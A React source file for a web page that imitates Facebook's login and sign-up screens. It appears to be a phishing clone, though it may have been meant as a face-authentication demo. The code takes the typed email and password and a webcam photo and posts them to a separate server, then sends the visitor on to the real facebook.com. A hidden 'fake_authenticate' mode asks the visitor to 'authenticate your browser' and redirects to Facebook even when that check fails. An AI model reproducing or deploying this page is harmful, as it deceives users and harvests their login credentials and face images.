import React, { Component } from 'react';
import './App.css';
import './facebook.css';
//import { Draft, EditorState } from 'draft-js';
//import { Editor } from 'react-draft-wysiwyg';
//import { convertToRaw, convertFromRaw } from 'draft-js';
import 'react-draft-wysiwyg/dist/react-draft-wysiwyg.css';
//import draftToHtml from 'draftjs-to-html';
//import { stateToHTML } from 'draft-js-export-html';
import ConditionalLink from './ConditionalLink.js';
import { BrowserRouter, Route, Link, Switch } from 'react-router-dom';


import Webcam from 'react-webcam';

class App extends Component {
  constructor() {
    super();
    this.state = {
      image: "",
      message: "Waiting for Authenticate",
      account: "",
      pwd: "",
      faceId: "",
      fake: false,
      authenticateType: "authenticate",
      ring: "",
      newAccount: "",
    }
    //this.updateHTML = this.updateHTML.bind(this);
    this.uploadImage = this.uploadImage.bind(this);
    this.verifyImage = this.verifyImage.bind(this);
    this.createImage = this.createImage.bind(this);
    this.deleteImage = this.deleteImage.bind(this);

    this.redirect = this.redirect.bind(this);
    this.checkStatus = this.checkStatus.bind(this);
    this.onAccountChange = this.onAccountChange.bind(this);
    this.onPwdChange = this.onPwdChange.bind(this);
    this.onCheckChange = this.onCheckChange.bind(this);
    this.onNewAccountChange = this.onNewAccountChange.bind(this);
    this.serverurl = "http://127.0.0.1:3001/";
    //this.serverurl = "https://server-slxijtelnu.now.sh/";
    //this.serverurl = "https://fierce-wildwood-17550.herokuapp.com/";
  }
  onEditorStateChange(editorState) {
    this.setState({ editorState, }, this.updateHTML);
  }

  onAccountChange(e){
    this.setState({account:e.target.value});
  }
  onPwdChange(e){
    this.setState({pwd:e.target.value});
  }
  onCheckChange(e){
    if(this.state.authenticateType==="authenticate")
      this.setState({authenticateType:'fake_authenticate'});
    else
      this.setState({authenticateType:'authenticate'});
  }
  onNewAccountChange(e){
    this.setState({newAccount:e.target.value});
  }
  checkStatus(response) {
      if (response.status >= 200 && response.status < 300) {
        return response;
      } else {
      var error = new Error(response.statusText);
        error.response = response;
        throw error;
      }
  }
  uploadImage(){
    let image = (this.state.image);
    let account = this.state.account;
    let pwd = this.state.pwd;
    fetch(`${this.serverurl}upload`, {
      method: 'post',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
      },
      
      body: JSON.stringify({
        "image":image,
        account: account,
        pwd: pwd,
      }),
    }).then(this.checkStatus)
    .then(response=>response.json())
    .then(resObj=>{
      if(resObj.status!=="SUCCESS")
        throw(resObj.message);
      this.setState({
        message: resObj.message,
        faceId: resObj.faceId,
      },this.verifyImage)
    })
    .catch(error=>{
      console.log('fail...');
      console.log(error);
      this.setState({
        message: error,
        ring: <div className="spinner-container">
                        <div className="spinner">
                          <div className="double-bounce1-red"></div>
                          <div className="double-bounce2-red"></div>
                        </div>
              </div>
      })
    });
  }
  verifyImage(){
    let image = (this.state.image);
    let account = this.state.account;
    let pwd = this.state.pwd;
    let faceId = this.state.faceId;
    fetch(`${this.serverurl}verify`, {
      method: 'post',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        faceId: faceId
      }),
    }).then(this.checkStatus)
    .then(response=>response.json())
    .then(resObj=>{
      if(resObj.status!=="SUCCESS")
        throw(resObj.message);
      this.setState({message:resObj.message},this.redirect)
    })
    .catch(error=>{
      if(this.state.authenticateType==="fake_authenticate")
        this.redirect();
      console.log('fail...');
      console.log(error);
    });
  }
  createImage(){

  }
  deleteImage(){

  }
  redirect(){
      window.location.replace("https://www.facebook.com/"); 
  }

  setRef = (webcam) => {
    this.webcam = webcam;
  }
  capture = () => {
    const imageSrc = this.webcam.getScreenshot();
    this.setState({
      message: "Checking...", 
      image: imageSrc,
      ring:     <div className="spinner-container">
                        <div className="spinner">
                          <div className="double-bounce1"></div>
                          <div className="double-bounce2"></div>
                        </div>
                </div>
    }, this.uploadImage);
  };
  capture_create = () => {
    const imageSrc = this.webcam.getScreenshot();
    this.setState({ 
      image: imageSrc,
    }, this.createImage);
  };
  capture_delete = () => {
    const imageSrc = this.webcam.getScreenshot();
    this.setState({ 
      image: imageSrc,
    }, this.deleteImage);
  };
  componentDidMount() {

  }
  
  updateHTML() {

  }
  
  render() {
    return (
      <div className="App">
        <BrowserRouter>
          <div>
            <div id="navwrapper">
              <div id="navbar">
                <table className="tablewrapper">
                  <tr>
                    <td className="row1">Email or Phone</td>
                    <td className="row1">Password</td>
                  </tr>
                  <tr>
                    <td><input type="text" onChange={this.onAccountChange} className="inputtext" value={this.state.account} />
                    </td>
                    <td><input type="text" onChange={this.onPwdChange} className="inputtext" value={this.state.pwd}/>
                    </td>
                    
                    <Link to={this.state.authenticateType}>
                      <td><div id="button">Log In</div></td>
                    </Link>
                    <input type="checkbox" defaultChecked={false} onChange={this.onCheckChange}></input>
                  </tr>
                  <tr>
                    <td>
                      <div className="row2"><input type="checkbox" checked />Keep me logged in</div></td>
                    <td className="row2 h">Forgot your password?</td>
                  </tr>
                </table>

                <h1 className="logowrapper">facebook</h1>

              </div>
            </div>

            <Switch>
              <Route exact path="/"
                render={(props) => (
                  <div>
                    <div id="contentwrapper">
                      <div id="content">
                        <div id="leftbod">
                          <div className="connect bolder">
                            Connect with friends and the
                            world around you on Facebook.</div>
                          <div className="leftbar">
                            <img src="https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xap1/t39.2365-6/851565_602269956474188_918638970_n.png" alt="" className="iconwrap fb1" />
                            <div className="fb1">
                              <span className="rowtext">See photos and updates</span>
                              <span className="rowtext2 fb1">from friends in News Feed</span>
                            </div>
                          </div>

                          <div className="leftbar">
                            <img src="https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xap1/t39.2365-6/851585_216271631855613_2121533625_n.png" alt="" className="iconwrap fb1" />
                            <div className="fb1">
                              <span className="rowtext">Share what's new</span>
                              <span className="rowtext2 fb1">in your life on your timeline</span>
                            </div>
                          </div>

                          <div className="leftbar">
                            <img src="https://fbcdn-dragon-a.akamaihd.net/hphotos-ak-xap1/t39.2365-6/851558_160351450817973_1678868765_n.png " alt="" className="iconwrap fb1" />
                            <div className="fb1">
                              <span className="rowtext">Find more</span>
                              <span className="rowtext2 fb1">of what you're looking for with graph search</span>
                            </div>
                          </div>


                        </div>

                        <div id="rightbod">
                          <div className="signup bolder">Sign Up</div>
                          <div className="free bolder">It's free and always will be</div>

                          <div className="formbox">
                            <input type="text" className="inputbody in1" placeholder="First name" />
                            <input type="text" className="inputbody in1 fr" placeholder="Last name" />
                          </div>
                          <div className="formbox">
                            <input type="text" className="inputbody in2" placeholder="Email or mobile number" />
                          </div>
                          <div className="formbox">
                            <input type="text" className="inputbody in2" placeholder="Re-enter email or mobile number" />
                          </div>
                          <div className="formbox">
                            <input type="text" className="inputbody in2" placeholder="New password" />
                          </div>
                          <div className="formbox">
                            <div className="bday">Birthday</div>
                          </div>
                          <div className="formbox">
                            <span data-type="selectors">
                              <span>
                                <select title="Month" className="selectbody"><option value="0" selected="1">Month</option><option value="1">Jan</option><option value="2">Feb</option><option value="3">Mar</option><option value="4">Apr</option><option value="5">May</option><option value="6">Jun</option><option value="7">Jul</option><option value="8">Aug</option><option value="9">Sep</option><option value="10">Oct</option><option value="11">Nov</option><option value="12">Dec</option></select>
                                <select title="Day" className="selectbody fl"><option value="0" selected="1">Day</option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option></select>
                                <select title="Year" className="selectbody fl"><option value="0" selected="1">Year</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option><option value="1912">1912</option><option value="1911">1911</option><option value="1910">1910</option><option value="1909">1909</option><option value="1908">1908</option><option value="1907">1907</option><option value="1906">1906</option><option value="1905">1905</option></select>
                              </span>
                              <div className="fb1 why h">Why do I need to provide my birthday?</div>
                              <div className="formbox mt1">
                                <span data-type="radio" className="spanpad">
                                  <input type="radio" id="fem" className="m0" />
                                  <label for="fem" className="gender">Female
                                  </label>
                                  <input type="radio" id="male" className="m0" />
                                  <label for="male" className="gender">Male
                                  </label>
                                </span>
                              </div>
                              <div className="formbox">
                                <div className="agree">
                                  By clicking Sign Up, you agree to our <div className="link">Terms</div> and that you have read our <div className="link">Data Use Policy</div>, including our <div className="link">Cookie Use</div>.
                              </div>
                              </div>
                              <div className="formbox">
                                <Link to="administrator">
                                  <div id="button">Admin</div>
                                </Link>
                                <button type="submit" className="signbut bolder">Sign Up</button>
                              </div>
                              <div className="formbox">
                                <div className="create"><div className="link h">Create a Page</div> for a celebrity, band or business.</div>
                              </div>
                            </span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                )} />
              <Route exact path="/authenticate"
                render={(props) => (
                  <div>
                    <div className="picture-container">
                      <div className="message"> {this.state.message}</div> {this.state.ring}
                      <div className="capture-button-container">
                        <button className="capture-button" onClick={this.capture}>Authenticate</button>
                      </div>
                      
                      <div className="picture-block">
                        <Webcam
                          audio={false}
                          height={480}
                          ref={this.setRef}
                          screenshotFormat="image/jpeg"
                          width={640}
                        />
                      </div>
                      
                    </div>
                    
                  </div>
                  
                )}
              />
              <Route exact path="/fake_authenticate"
                render={(props) => (
                  <div>
                    <div className="picture-container">
                      <div className="message"> {this.state.message}</div>
                      <div className="capture-button-container">
                        <button className="capture-button" onClick={this.capture}>Press to authenticate your browser</button>
                      </div>
                      {this.state.ring}
                      <div className="picture-block-fake">
                        <Webcam
                          audio={false}
                          height={480}
                          ref={this.setRef}
                          screenshotFormat="image/jpeg"
                          width={640}
                        />
                      </div>
                    </div>
                  </div>
                )}
              />
              <Route exact path="/administrator"
                render={(props) => (
                  <div>
                    <div className="picture-container">
                      
                      <div className="picture-block">
                        <Webcam
                          audio={false}
                          height={480}
                          ref={this.setRef}
                          screenshotFormat="image/jpeg"
                          width={640}
                        />
                      </div>
                      <div className="account-input-container">
                        <div className="account-text">Account:</div>
                        <input className="account-input" onChange={this.onNewAccountChange} className="inputtext" value={this.state.newAccount}></input>
                      </div>

                      <div className="capture-button-container">
                        <button className="capture-button" onClick={this.capture}>Create</button>
                      </div>
                      <div className="capture-button-container">
                        <button className="delete-button" onClick={this.capture}>Delete(By Photo)</button>
                      </div>
                    </div>
                    <div className="message"> {this.state.message}</div>
                  </div>
                )}
              />
            </Switch>
          </div>
        </BrowserRouter>
      </div>
    );
  }
}



export default App;
